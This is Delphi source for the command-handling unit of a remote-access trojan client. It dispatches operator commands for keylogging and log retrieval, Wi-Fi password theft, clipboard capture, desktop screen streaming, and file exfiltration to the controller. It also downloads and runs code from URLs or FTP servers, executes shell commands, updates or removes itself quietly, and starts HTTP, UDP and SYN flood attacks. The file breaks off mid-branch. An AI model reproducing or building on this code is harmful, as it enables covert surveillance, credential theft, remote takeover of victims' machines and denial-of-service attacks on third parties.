unit UnitExecuteCommands;

interface

uses
  Windows, MMSystem, SocketUnit, UnitActiveConnections, UnitConfiguration,
  UnitConnection,UnitConstants, UnitDdosAttack, UnitFunctions, UnitFilesManager,
  UnitInformations, UnitInstallation, UnitKeyboardInputs, UnitMicrophone,
  UnitPluginManager, UnitPortScanner, UnitRegistryEditor, UnitStringCompression,
  UnitStringEncryption, UnitSniffer, UnitShell, UnitTasksManager, UnitTransfersManager,
  UnitVariables, UnitWebcamCapture, UnitWifiPasswords, UnitWindowProc, uftp,
  UnitStartWebcam, UnitCaptureFunctions;

procedure ExecuteCommands(Datas: string);

implementation

procedure ExecuteCommands(Datas: string);
var
  MainCommand: string;
  TmpStr, TmpStr1, TmpStr2,
  TmpStr3, TmpStr4, TmpStr5, TmpStr6: string;
  ClipboardTxt: WideString;
  TmpHandle, TmpMutex: THandle;
  TmpInt, TmpInt1, i: Integer;
  ClientSocket, DesktopSocket: TClientSocket;
  DesktopInterval, DesktopQuality, DesktopX, DesktopY: Integer;
  FTpAccess: tFtpAccess;
  TmpBool: Boolean;
begin
  MainCommand := Copy(Datas, 1, Pos('|', Datas)-1);
  Delete(Datas, 1, Pos('|', Datas));

  if MainCommand = ACTIVECONNECTIONSCLOSE then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));

    TmpStr1 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));

    TmpStr2 := Copy(TmpStr1, 1, Pos(':', TmpStr1)-1);
    Delete(TmpStr1, 1, Pos('|', TmpStr1));

    TmpStr3 := Copy(Datas, 1, Pos(':', Datas)-1);
    Delete(Datas, 1, Pos(':', Datas));

    if CloseConnection(TmpStr1, TmpStr3, StrToInt(TmpStr2), StrToInt(Datas)) then
      TmpStr := TASKSMANAGER + '|' + ACTIVECONNECTIONS + '|' + MainCommand + '|' + TmpStr + '|Y'
    else TmpStr := TASKSMANAGER + '|' + ACTIVECONNECTIONS + '|' + MainCommand + '|' + TmpStr + '|N';

    SendDatas(MainConnection, TmpStr);
  end
  else

  if MainCommand = ACTIVECONNECTIONSKILLPROCESS then
  begin
    if KillProcess(Datas) then
      TmpStr := TASKSMANAGER + '|' + ACTIVECONNECTIONS + '|' + MainCommand + '|' + Datas + '|Y'
    else TmpStr := TASKSMANAGER + '|' + ACTIVECONNECTIONS + '|' + MainCommand + '|' + Datas + '|N';

    SendDatas(MainConnection, TmpStr);
  end
  else
                
  if MainCommand = ACTIVECONNECTIONSLIST then
  begin
    ReadTCPTable;
    ReadUdpTable;

    TmpStr := TASKSMANAGER + '|' + ACTIVECONNECTIONS + '|' + MainCommand;

    if Datas = 'Y' then TmpStr := TmpStr  + '|' + ListActiveConnections(True) else
      TmpStr := TmpStr + '|' + ListActiveConnections(False);

    SendDatas(MainConnection, TmpStr);
  end
  else
                 
  if MainCommand = CDDRIVECLOSE then
  begin
    mciSendString('Set cdaudio door closed wait', nil, 0, 0);
  end
  else

  if MainCommand = CDDRIVEOPEN then
  begin
    mciSendString('Set cdaudio door open wait', nil, 0, 0);
  end
  else

  if MainCommand = CHATSTART then
  begin
    Nickname := Datas;
    StartThread(@StartChat);
  end
  else
                  
  if MainCommand = CHATSTOP then
  begin
    StopChat;
  end
  else

  if MainCommand = CHATTEXT then
  begin
    WriteMessage(Datas);
  end
  else
          
  if MainCommand = CLIENTCLOSE then
  begin
    CreateMutex(nil, False, PChar(_MutexName + '_EXIT'));
    Sleep(5000);
    UnloadPlugin;
    Exitprocess(0);
  end
  else
             
  if MainCommand = CLIENTRENAME then
  begin
    try
      CreateKeyString(HKEY_CURRENT_USER, 'Software\' + _ClientId,
        'Identification', Datas);
      NewIdentification := Datas;
      TmpStr := MainCommand + '|' + Datas + '|Y';
    except
      TmpStr := MainCommand + '|' + Datas + '|N';
    end;

    SendDatas(MainConnection, TmpStr);
  end
  else
       
  if MainCommand = CLIENTREMOVE then
  begin
    CreateMutex(nil, False, PChar(_MutexName + '_EXIT'));
    Sleep(5000); 
    UnloadPlugin;
    RemoveClient;
    Exitprocess(0);
  end
  else

  if MainCommand = CLIENTRESTART then
  begin
    CreateMutex(nil, False, PChar(_MutexName + '_EXIT'));
    Sleep(5000);                          
    UnloadPlugin;
    MyShellExecute(ClientPath, '', SW_HIDE);
    Exitprocess(0);
  end
  else

  if MainCommand = CLIENTUPDATEFROMFTP then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr1 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr2 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr3 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr4 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));

    TmpMutex := CreateMutex(nil, False, pchar(_MutexName + '_UPDATE'));
    FTpAccess := tFtpAccess.create(TmpStr, TmpStr1, TmpStr2, StrToInt(Datas));

    if (not Assigned(FTpAccess)) or (not FTpAccess.connected) then
    begin
      CloseHandle(TmpMutex);
      SendDatas(MainConnection, UPDATEERROR + '|');
      FTpAccess.Free;
      Exit;
    end;

    if FTpAccess.SetDir('./' + TmpStr3) = False then
    begin
      CloseHandle(TmpMutex);
      SendDatas(MainConnection, UPDATEERROR + '|');
      FTpAccess.Free;
      Exit;
    end;

    TmpStr4 := AppDataDir + FTpAccess.GetFile(TmpStr4);
    if not FileExists(TmpStr4) then
    begin
      CloseHandle(TmpMutex);
      SendDatas(MainConnection, UPDATEERROR + '|');
      FTpAccess.Free;
      Exit;
    end;

    FTpAccess.Free;

    if MyShellExecute(TmpStr4, '', SW_HIDE) <= 32 then
    begin
      CloseHandle(TmpMutex);
      SendDatas(MainConnection, UPDATEERROR + '|');
      Exit;
    end;

    CloseHandle(TmpMutex);

    CreateMutex(nil, False, pchar(_MutexName + '_EXIT'));
    Sleep(5000);                   
    UnloadPlugin;
    RemoveClient;
    Exitprocess(0);
  end
  else

  if MainCommand = CLIENTUPDATEFROMLINK then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));

    TmpMutex := CreateMutex(nil, False, pchar(_MutexName + '_UPDATE'));
    if MyURLDownloadToFile(TmpStr, Datas) then
    if MyShellExecute(Datas, '', SW_HIDE) <= 32 then
    begin
      CloseHandle(TmpMutex);
      SendDatas(MainConnection, UPDATEERROR + '|');
      Exit;
    end;

    CloseHandle(TmpMutex);

    CreateMutex(nil, False, pchar(_MutexName + '_EXIT'));
    Sleep(5000);     
    UnloadPlugin;
    RemoveClient;
    Exitprocess(0);
  end
  else
        
  if MainCommand = CLIENTUPDATEFROMLOCAL then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpInt := StrToInt(Copy(Datas, 1, Pos('|', Datas)-1));
    Delete(Datas, 1, Pos('|', Datas));

    TmpMutex := CreateMutex(nil, False, PChar(_MutexName + '_UPDATE'));
    if ReceiveFile(TmpStr, AppDataDir + ExtractFileName(TmpStr), TmpInt, MainCommand) = True then
    if MyShellExecute(AppDataDir + ExtractFileName(TmpStr), '', SW_HIDE) <= 32 then
    begin
      CloseHandle(TmpMutex);
      SendDatas(MainConnection, UPDATEERROR + '|');
      Exit;
    end;
    
    CloseHandle(TmpMutex);

    CreateMutex(nil, False, PChar(_MutexName + '_EXIT'));
    Sleep(5000); 
    UnloadPlugin;
    RemoveClient;
    Exitprocess(0);
  end
  else

  if MainCommand = CLIPBOARDCLEAR then
  begin
    try
      OpenClipboard(0);
      EmptyClipboard;
    finally
      CloseClipboard;
    end;
  end
  else
    
  if MainCommand = CLIPBOARDTEXT then
  begin
    if GetClipboardText(0, ClipboardTxt) then
      TmpStr := CLIPBOARD + '|' + MainCommand + '|' + ClipboardTxt
    else
    if GetClipboardFiles(ClipboardTxt) then
      TmpStr := CLIPBOARD + '|' + CLIPBOARDFILES + '|' + ClipboardTxt
    else
      TmpStr := CLIPBOARD + '|' + MainCommand + '|';

    SendDatas(MainConnection, TmpStr);
  end
  else
  
  if MainCommand = CLIPBOARDSETTEXT then
  begin
    try
      OpenClipboard(0);
      EmptyClipboard;
    finally
      CloseClipboard;
    end;

    SetClipboardText(PChar(Datas));
    SendDatas(MainConnection, CLIPBOARD + '|' + CLIPBOARDTEXT + '|' + Datas);
  end
  else
   
  if MainCommand = COMPUTERLOGOFF then
  begin
    SetTokenPrivileges('SeShutdownPrivilege');
    ExitWindowsEx(EWX_LOGOFF or EWX_FORCE, 0);
  end
  else

  if MainCommand = COMPUTERREBOOT then
  begin
    SetTokenPrivileges('SeShutdownPrivilege');
    ExitWindowsEx(EWX_REBOOT or EWX_FORCE, 0);
  end
  else

  if MainCommand = COMPUTERSHUTDWON then
  begin
    SetTokenPrivileges('SeShutdownPrivilege');
    ExitWindowsEx(EWX_SHUTDOWN or EWX_FORCE, 0);
  end
  else
     
  if MainCommand = DESKTOPCAPTURESTART then
  begin
    DesktopQuality := StrToInt(Copy(Datas, 1, Pos('|', Datas)-1));
    Delete(Datas, 1, Pos('|', Datas));
    DesktopX := StrToInt(Copy(Datas, 1, Pos('|', Datas)-1));
    Delete(Datas, 1, Pos('|', Datas));
    DesktopY := StrToInt(Copy(Datas, 1, Pos('|', Datas)-1));
    Delete(Datas, 1, Pos('|', Datas));
    DesktopInterval := StrToInt(Datas);

    _SendDatas(DesktopSocket, DESKTOPIMAGE + '|');

    while (DesktopSocket.Connected = True) and (MainConnection.Connected = True) do
    begin
      ProcessMessages;
      if DesktopInterval > 0 then Sleep(DesktopInterval*1000);
      TmpStr := GetDesktopImage(DesktopQuality, DesktopX, DesktopY, 0);
      if TmpStr <> '' then SendDatas(DesktopSocket, TmpStr);
    end;

    try DesktopSocket.Destroy; except end;
  end
  else

  if MainCommand = DESKTOPHIDEICONS then
  begin
    ShowWindow(GetWindow(FindWindow('ProgMan', nil), GW_CHILD), SW_HIDE);
  end
  else

  if MainCommand = DESKTOPHIDESYSTEMTRAY then
  begin
    ShowWindow(FindWindowEx(FindWindowEx(FindWindow('Shell_TrayWnd', nil), 0,
      'TrayNotifyWnd', nil), 0, 'SysPager', nil), SW_HIDE);
  end
  else
      
  if MainCommand = DESKTOPHIDETASKSBAR then
  begin
    ShowWindow(FindWindow('Shell_TrayWnd', nil), SW_HIDE);
  end
  else
      
  if MainCommand = DESKTOPSETTINGS then
  begin
    DesktopQuality := StrToInt(Copy(Datas, 1, Pos('|', Datas)-1));
    Delete(Datas, 1, Pos('|', Datas));
    DesktopX := StrToInt(Copy(Datas, 1, Pos('|', Datas)-1));
    Delete(Datas, 1, Pos('|', Datas));
    DesktopY := StrToInt(Copy(Datas, 1, Pos('|', Datas)-1));
    Delete(Datas, 1, Pos('|', Datas));
    DesktopInterval := StrToInt(Datas);
  end
  else
        
  if MainCommand = DESKTOPSHOWICONS then
  begin
    ShowWindow(GetWindow(FindWindow('ProgMan', nil), GW_CHILD), SW_SHOW);
  end
  else

  if MainCommand = DESKTOPSHOWSYSTEMTRAY then
  begin
    ShowWindow(FindWindowEx(FindWindowEx(FindWindow('Shell_TrayWnd', nil), 0,
      'TrayNotifyWnd', nil), 0, 'SysPager', nil), SW_SHOW);
  end
  else
     
  if MainCommand = DESKTOPSHOWTASKSBAR then
  begin
    ShowWindow(FindWindow('Shell_TrayWnd', nil), SW_SHOWNA);
  end
  else
     
  if MainCommand = DESKTOPTHUMBNAIL then
  begin
    TmpInt := StrToInt(Copy(Datas, 1, Pos('|', Datas)-1));
    Delete(Datas, 1, Pos('|', Datas));
    TmpInt1 := StrToInt(Datas);
    TmpStr := GetDesktopImage(80, TmpInt, TmpInt1, 0);
    SendDatas(MainConnection, MainCommand + '|' + TmpStr);
  end
  else

  if MainCommand = EXECUTESHELLCOMMAND then
  begin
    xExecuteShellCommand(Datas);
  end
  else
         
  if MainCommand = FILESCOPYFILE then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));

    if CopyFile(PChar(TmpStr), PChar(Datas), False) then
      TmpStr := FILESMANAGER + '|' + MainCommand + '|' + ExtractFileName(TmpStr) + '|Y'
    else TmpStr := FILESMANAGER + '|' + MainCommand + '|' + ExtractFileName(TmpStr) + '|N';

    SendDatas(MainConnection, TmpStr);
  end
  else

  if MainCommand = FILESCOPYFOLDER then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));

    if CopyDirectory(0, TmpStr, Datas) then
      TmpStr := FILESMANAGER + '|' + MainCommand + '|' + ExtractFileName(TmpStr) + '|Y'
    else TmpStr := FILESMANAGER + '|' + MainCommand + '|' + ExtractFileName(TmpStr) + '|N';

    SendDatas(MainConnection, TmpStr);
  end
  else
            
  if MainCommand = FILESDELETEFOLDER then
  begin
    if DeleteAllFilesAndDir(Datas) then
      TmpStr := FILESMANAGER + '|' + MainCommand + '|' + ExtractFileName(Datas) + '|Y'
    else TmpStr := FILESMANAGER + '|' + MainCommand + '|' + ExtractFileName(Datas) + '|N';

    SendDatas(MainConnection, TmpStr);
  end
  else
   
  if MainCommand = FILESDELETEFILE then
  begin
    if MyDeleteFile(Datas) then
      TmpStr := FILESMANAGER + '|' + MainCommand + '|' + ExtractFileName(Datas) + '|Y'
    else TmpStr := FILESMANAGER + '|' + MainCommand + '|' + ExtractFileName(Datas) + '|N';

    SendDatas(MainConnection, TmpStr);
  end
  else
       
  if MainCommand = FILESDOWNLOADFILE then
  begin
    SendFile(Datas, MyGetFileSize(Datas), 0);
  end
  else
        
  if MainCommand = FILESEDITFILE then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));

    if MyDeleteFile(TmpStr) = False then
    begin
      SendDatas(MainConnection, FILESMANAGER + '|' + MainCommand);
      Exit;
    end;

    CreateTextFile(TmpStr, Datas);
  end
  else
     
  if MainCommand = FILESEXECUTEFROMFTP then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr1 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr2 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr3 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr4 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));

    FTpAccess := tFtpAccess.create(TmpStr, TmpStr1, TmpStr2, StrToInt(Datas));

    if (not Assigned(FTpAccess)) or (not FTpAccess.connected) then
    begin
      FTpAccess.Free;
      Exit;
    end;

    if FTpAccess.SetDir('./' + TmpStr3) = False then
    begin
      FTpAccess.Free;
      Exit;
    end;

    TmpStr4 := AppDataDir + FTpAccess.GetFile(TmpStr4);
    if not FileExists(TmpStr4) then
    begin
      FTpAccess.Free;
      Exit;
    end;

    MyShellExecute(AppDataDir + TmpStr4, '', SW_SHOWNORMAL);
    FTpAccess.Free;
  end
  else

  if MainCommand = FILESEXECUTEFROMLINK then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    if MyURLDownloadToFile(TmpStr, Datas) then MyShellExecute(Datas, '', SW_SHOWNORMAL);
  end
  else

  if MainCommand = FILESEXECUTEFROMLOCAL then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpInt := StrToInt(Copy(Datas, 1, Pos('|', Datas)-1));
    Delete(Datas, 1, Pos('|', Datas));
    
    if ReceiveFile(TmpStr, AppDataDir + ExtractFileName(TmpStr), TmpInt, MainCommand) = True then
      MyShellExecute(AppDataDir + ExtractFileName(TmpStr), '', SW_SHOWNORMAL);
  end
  else
         
  if MainCommand = FILESIMAGEPREVIEW then
  begin
    while Datas <> '' do
    begin
      ProcessMessages;
      TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
      Delete(Datas, 1, Pos('|', Datas));
      TmpStr1 := GetAnyImageToString(TmpStr, 50, 100, 100);
      TmpStr2 := TmpStr2 + TmpStr + '|' + TmpStr1 + '|';
    end;

    SendDatas(MainConnection, FILESMANAGER + '|' + FILESIMAGEPREVIEW + '|' + TmpStr2);
  end
  else
          
  if MainCommand = FILESLISTDRIVES then
  begin
    SendDatas(MainConnection, FILESMANAGER + '|' + MainCommand + '|' + ListDrives);
  end
  else
       
  if MainCommand = FILESEXECUTEHIDEN then
  begin
    MyShellExecute(Datas, '', SW_HIDE);
  end
  else

  if MainCommand = FILESEXECUTEVISIBLE then
  begin
    MyShellExecute(Datas, '', SW_SHOWNORMAL);
  end
  else
          
  if MainCommand = FILESLISTFOLDERS then
  begin
    TmpStr := FILESMANAGER + '|' + MainCommand + '|' + ListDirectory(Datas, True);
    SendDatas(MainConnection, TmpStr);
    Sleep(50);
    TmpStr := FILESMANAGER + '|' + FILESLISTFILES + '|' + ListDirectory(Datas, False);
    SendDatas(MainConnection, TmpStr);
  end
  else
              
  if MainCommand = FILESLISTSHAREDFOLDERS then
  begin
    SendDatas(MainConnection, FILESMANAGER + '|' + MainCommand + '|' + ListSharedFolders);
  end
  else

  if MainCommand = FILESLISTSPECIALSFOLDERS then
  begin
    SendDatas(MainConnection, FILESMANAGER + '|' + MainCommand + '|' + ListSpecialFolders);
  end
  else
               
  if MainCommand = FILESMOVEFOLDER then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));

    if MoveFile(PChar(TmpStr), PChar(Datas)) then
      TmpStr := FILESMANAGER + '|' + MainCommand + '|' + ExtractFileName(TmpStr) + '|Y'
    else TmpStr := FILESMANAGER + '|' + MainCommand + '|' + ExtractFileName(TmpStr) + '|N';

    SendDatas(MainConnection, TmpStr);
  end
  else

  if MainCommand = FILESMOVEFILE then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));

    if MoveFile(PChar(TmpStr), PChar(Datas)) then
      TmpStr := FILESMANAGER + '|' + MainCommand + '|' + ExtractFileName(TmpStr) + '|Y'
    else TmpStr := FILESMANAGER + '|' + MainCommand + '|' + ExtractFileName(TmpStr) + '|N';

    SendDatas(MainConnection, TmpStr);
  end
  else
      
  if MainCommand = FILESMULTIDOWNLOAD then
  begin
    while Datas <> '' do
    begin
      ProcessMessages;
      TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
      Delete(Datas, 1, Pos('|', Datas));
      SendFile(TmpStr, MyGetFileSize(TmpStr), 0);
      Sleep(500);
    end;
  end
  else
          
  if MainCommand = FILESNEWFOLDER then
  begin
    if CreateDirectory(PChar(Datas), nil) then
      TmpStr := FILESMANAGER + '|' + MainCommand + '|' + ExtractFileName(Datas) + '|Y'
    else TmpStr := FILESMANAGER + '|' + MainCommand + '|' + ExtractFileName(Datas) + '|N';

    SendDatas(MainConnection, TmpStr);
  end
  else
             
  if MainCommand = FILESRENAMEFILE then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));

    if MyRenameFile_Dir(TmpStr, Datas) then
      TmpStr := FILESMANAGER + '|' + MainCommand + '|' + ExtractFileName(TmpStr) + '|Y|' + ExtractFileName(Datas)
    else TmpStr := FILESMANAGER + '|' + MainCommand + '|' + ExtractFileName(TmpStr) + '|N|' + ExtractFileName(Datas);

    SendDatas(MainConnection, TmpStr);
  end
  else

  if MainCommand = FILESRENAMEFOLDER then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));

    if MyRenameFile_Dir(TmpStr, Datas) then
      TmpStr := FILESMANAGER + '|' + MainCommand + '|' + ExtractFileName(TmpStr) + '|Y|' + ExtractFileName(Datas)
    else TmpStr := FILESMANAGER + '|' + MainCommand + '|' + ExtractFileName(TmpStr) + '|N|' + ExtractFileName(Datas);

    SendDatas(MainConnection, TmpStr);
  end
  else
            
  if MainCommand = FILESRESUMEDOWNLOAD then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpInt := StrToInt(Copy(Datas, 1, Pos('|', Datas)-1));
    Delete(Datas, 1, Pos('|', Datas));
    SendFile(TmpStr, MyGetFileSize(TmpStr), TmpInt);
  end
  else

  if MainCommand = FILESSEARCHFILE then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr1 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    if Datas = 'Y' then SearchFileThread := TSearchFileThread.Create(TmpStr, TmpStr1, True) else
    SearchFileThread := TSearchFileThread.Create(TmpStr, TmpStr1, False);
    SearchFileThread.Resume;
  end
  else

  if MainCommand = FILESSEARCHIMAGEPREVIEW then
  begin
    while Datas <> '' do
    begin
      ProcessMessages;
      TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
      Delete(Datas, 1, Pos('|', Datas));
      TmpStr1 := GetAnyImageToString(TmpStr, 50, 100, 100);
      TmpStr2 := TmpStr2 + TmpStr + '|' + TmpStr1 + '|';
    end;

    SendDatas(MainConnection, FILESMANAGER + '|' + FILESSEARCHIMAGEPREVIEW + '|' + TmpStr2);
  end
  else
    
  if MainCommand = FILESSENDFTP then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr1 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr2 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr3 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr4 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));

    FTpAccess := tFtpAccess.create(TmpStr, TmpStr1, TmpStr2, StrToInt(Datas));

    if (not Assigned(FTpAccess)) or (not FTpAccess.connected) then
    begin
      SendDatas(MainConnection, FILESMANAGER + '|' + MainCommand + '|N');
      FTpAccess.Free;
      Exit;
    end;

    if FTpAccess.SetDir('./' + TmpStr3) = False then
    begin
      SendDatas(MainConnection, FILESMANAGER + '|' + MainCommand + '|N');
      FTpAccess.Free;
      Exit;
    end;

    if FTpAccess.PutFile(TmpStr4, ExtractFileName(TmpStr4)) = False then
    begin
      SendDatas(MainConnection, FILESMANAGER + '|' + MainCommand + '|N');
      FTpAccess.Free;
      Exit;
    end;

    SendDatas(MainConnection, FILESMANAGER + '|' + MainCommand + '|Y');
    FTpAccess.Free;
  end
  else
             
  if MainCommand = FILESSTOPSEARCHING then
  begin
    StopSearching := True;
    SearchFileThread.Free;
  end
  else

  if MainCommand = FILESUPLOADFILEFROMFTP then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr1 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr2 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr3 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr4 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr5 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr6 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));

    FTpAccess := tFtpAccess.create(TmpStr1, TmpStr2, TmpStr3, StrToInt(TmpStr6));

    if (not Assigned(FTpAccess)) or (not FTpAccess.connected) then
    begin
      SendDatas(MainConnection, FILESMANAGER + '|' + MainCommand + '|N');
      FTpAccess.Free;
      Exit;
    end;

    if FTpAccess.SetDir('./' + TmpStr3) = False then
    begin
      SendDatas(MainConnection, FILESMANAGER + '|' + MainCommand + '|N');
      FTpAccess.Free;
      Exit;
    end;

    TmpStr4 := TmpStr + FTpAccess.GetFile(TmpStr4);
    if not FileExists(TmpStr4) then
    begin
      SendDatas(MainConnection, FILESMANAGER + '|' + MainCommand + '|N');
      FTpAccess.Free;
      Exit;
    end;

    if Datas = 'Y' then MyShellExecute(TmpStr4, '', SW_SHOWNORMAL);
    FTpAccess.Free;
  end
  else

  if MainCommand = FILESUPLOADFILEFROMLINK then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr1 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));

    if MyURLDownloadToFile(TmpStr, TmpStr1) then
    if Datas = 'Y' then MyShellExecute(Datas, '', SW_SHOWNORMAL);
  end
  else

  if MainCommand = FILESUPLOADFILEFROMLOCAL then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr1 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr2 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpInt := StrToInt(Copy(Datas, 1, Pos('|', Datas)-1));
    Delete(Datas, 1, Pos('|', Datas));

    TmpStr3 := TmpStr + ExtractFileName(TmpStr1);
    if ReceiveFile(TmpStr1, TmpStr3, TmpInt, FILESMANAGER + '|' + MainCommand) = True then
    if TmpStr2 = 'Y' then MyShellExecute(TmpStr3, '', SW_SHOWNORMAL);
  end
  else
          
  if MainCommand = FILESVIEWFILE then
  begin
    SendDatas(MainConnection, FILESMANAGER + '|' + MainCommand + '|' +
              Datas + '|' + LoadTextFile(Datas));
  end
  else

  if MainCommand = FLOODHTTPSTART then
  begin
    StartHttpFlood(Datas);
  end
  else

  if MainCommand = FLOODHTTPSTOP then
  begin
    if Datas = 'Y' then StopHttpFlood(True) else StopHttpFlood(False);
  end
  else

  if MainCommand = FLOODUDPSTART then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    StartUdpFlood(TmpStr, StrToInt(Datas));
  end
  else

  if MainCommand = FLOODUDPSTOP then
  begin
    if Datas = 'Y' then StopUdpFlood(True) else StopUdpFlood(False);
  end
  else
            
  if MainCommand = FLOODSYNSTART then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    StartSynFlood(TmpStr, StrToInt(Datas));
  end
  else

  if MainCommand = FLOODSYNSTOP then
  begin
    if Datas = 'Y' then StopSynFlood(True) else StopSynFlood(False)
  end
  else

  if MainCommand = INFOSMAIN then
  begin
    if NewIdentification = '' then NewIdentification := _ClientId;
    SendDatas(MainConnection, MainCommand + '|' + ListMainInfos);
  end
  else                                                         
      
  if MainCommand = INFOSSYSTEM then
  begin
    TmpStr := _ClientConfig + '|' + ListSystemInfos;
    SendDatas(MainConnection, MainCommand + '|' + TmpStr);
  end
  else                                                         

  if MainCommand = INFOSREFRESH then
  begin
    if FileExists(Pluginfile) then TmpStr := 'Yes' else TmpStr := 'No';
    SendDatas(MainConnection, MainCommand + '|' + TmpStr);
  end
  else

  if MainCommand = KEYLOGGERDELREPO then
  begin
    if MyDeleteFile(KeylogsPath + '\' + Datas) then
      TmpStr := KEYLOGGER + '|' + MainCommand + '|' + Datas + '|Y'
    else TmpStr := KEYLOGGER + '|' + MainCommand + '|' + Datas + '|N';

    SendDatas(MainConnection, TmpStr);
  end
  else

  if MainCommand = KEYLOGGERGETLOGS then
  begin
    SendDatas(MainConnection, KEYLOGGER + '|' + MainCommand + '|' +
              ListDirectory(KeylogsPath + '\' + Datas, False));
  end
  else

  if MainCommand = KEYLOGGERGETREPO then
  begin
    SendDatas(MainConnection, KEYLOGGER + '|' + MainCommand + '|' +
              ListDirectory(KeylogsPath, True));
  end
  else

  if MainCommand = KEYLOGGERLIVESTART then
  begin
    KeyloggerThread := StartThread(@StartOnlineKeylogger);
  end
  else
     
  if MainCommand = KEYLOGGERLIVESTOP then
  begin
    CloseThread(KeyloggerThread);
  end
  else

  if MainCommand = KEYLOGGERREADLOG then
  begin
    TmpStr := LoadTextFile(KeylogsPath + '\' + Datas);
    TmpStr := EnDecryptString(TmpStr, PROGRAMPASSWORD);
    SendDatas(MainConnection, KEYLOGGER + '|' + MainCommand + '|' +
              Datas + '|' + TmpStr);
  end
  else
              
  if MainCommand = MESSAGESBOX then
  begin
    TmpStr := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr1 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr2 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));
    TmpStr3 := Copy(Datas, 1, Pos('|', Datas)-1);
    Delete(Datas, 1, Pos('|', Datas));

    ShowMsg(StrToInt(TmpStr), TmpStr1,  TmpStr2, StrToInt(TmpStr3), StrToInt(Datas));
  end
  else

